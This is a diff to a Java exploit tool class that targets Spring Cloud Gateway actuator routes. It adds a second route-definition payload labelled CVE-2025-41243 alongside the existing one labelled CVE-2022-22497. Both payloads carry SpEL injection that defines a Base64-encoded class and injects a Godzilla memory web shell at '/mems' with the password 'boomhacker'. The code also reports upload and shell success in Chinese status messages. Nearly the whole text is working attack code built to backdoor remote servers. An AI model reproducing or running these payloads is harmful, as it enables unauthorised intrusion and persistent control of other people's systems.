@@ -1,4 +1,4 @@
-package src.main.exp.core;
+package src.main.memory.core;
 
 import src.main.common.HTTPConfig;
 import src.main.loadlib.MemshellLoad.MemshellLoad;
@@ -18,23 +18,49 @@ public class ExpCore {
     public ExpCore(String address){
         this.address = address;
     }
-    public Stream<String> ShellGaw() throws IOException {
+    public Stream<String> ShellGaw(int type) throws IOException {
         Stream.Builder<String> builder = Stream.builder();
         String res = "";
         String refapi = "";
         String api = "";
-        String data =
-                "{\n" +
-                        "  \"id\": \"pwnshell\",\n" +
-                        "  \"filters\": [{\n" +
-                        "    \"name\": \"AddResponseHeader\",\n" +
-                        "    \"args\": {\n" +
-                        "      \"name\": \"Result\",\n" +
-                        "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
-                        "    }\n" +
-                        "  }],\n" +
-                        "  \"uri\": \"http://example.com\"\n" +
-                        "}";
+        String data = "";
+        String result = "";
+        if (type == 6) {
+            data = "{\n" +
+                    "  \"id\": \"pwnshell\",\n" +
+                    "  \"filters\": [{\n" +
+                    "    \"name\": \"AddResponseHeader\",\n" +
+                    "    \"args\": {\n" +
+                    "      \"name\": \"Result\",\n" +
+                    "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
+                    "    }\n" +
+                    "  }],\n" +
+                    "  \"uri\": \"http://example.com\"\n" +
+                    "}";
+        }else if(type == 20) {
+            data = "{\n" +
+                    "  \"predicates\": [\n" +
+                    "    {\n" +
+                    "      \"name\": \"Path\",\n" +
+                    "      \"args\": {\n" +
+                    "        \"_genkey_0\": \"/actuators/pwnshell\"\n" +
+                    "      }\n" +
+                    "    }\n" +
+                    "  ],\n" +
+                    "\"filters\": [\n" +
+                    "    {\n" +
+                    "      \"name\": \"RewritePath\",\n" +
+                    "      \"args\": {\n" +
+                    "        \"_genkey_0\": \"/pwnshell\",\n" +
+                    "        \"_genkey_1\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
+                    "      }\n" +
+                    "    }\n" +
+                    "  ],\n" +
+                    "\"uri\": \"http://example.com\",\n" +
+                    "\"order\": -1\n" +
+                    "}";
+        }
+        builder.add("正在上传内存马");
         MemshellLoad ms = new MemshellLoad();
         String shell = ms.run();
         String shellData = String.format(data,shell);
@@ -75,7 +101,7 @@ public class ExpCore {
                 StringBuilder content = new StringBuilder();
                 while ((inputLine = in.readLine()) != null) {
                     content.append(inputLine);
-                    res = inputLine.toString();
+                    res = inputLine;
                 }
                 int responseCode3 = conn3.getResponseCode();
                 if (responseCode3 == HttpURLConnection.HTTP_OK){
@@ -84,19 +110,25 @@ public class ExpCore {
                         Pattern pattern = Pattern.compile(resultPattern);
                         Matcher matcher = pattern.matcher(content.toString());
                         if (matcher.find()) {
-                            if(matcher.group(1).equals("ok")) {
-                                String result = "哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
-                                builder.add(result);
+                            if(matcher.group(1).contains("ok")) {
+                                result = "CVE-2022-22497 哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                             }else{
-                                String result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
-                                builder.add(result);
+                                result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
                             }
+                            builder.add(result);
+                        }else if (content.toString().contains("RewritePath /pwnshell")) {
+                            if(content.toString().contains("RewritePath /pwnshell = 'ok'")) {
+                                result = "CVE-2025-41243 哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
+                            }else{
+                                result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
+                            }
+                            builder.add(result);
                         }
                     }else {
                         builder.add(address + "   " + "Getshell失败，请重试");
                     }
                 }else{
-                    builder.add("POST request failed with response code: " + responseCode1);
+                    builder.add("上传内存马失败: " + responseCode3);
                 }
             }
         }
